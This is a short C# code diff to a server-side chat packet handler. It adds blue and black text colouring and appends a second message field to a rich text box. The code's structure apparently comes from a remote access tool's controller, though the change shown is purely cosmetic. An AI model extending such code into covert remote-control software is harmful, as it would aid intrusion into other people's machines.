@@ -8,6 +8,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Drawing;
 
 namespace Server.Handle_Packet
 {
@@ -21,7 +22,10 @@ namespace Server.Handle_Packet
                 if (chat != null)
                 {
                     Console.Beep();
+                    chat.richTextBox1.SelectionColor = Color.Blue;
                     chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
+                    chat.richTextBox1.SelectionColor = Color.Black;
+                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput2").AsString);
                     chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
                     chat.richTextBox1.ScrollToCaret();
                 }
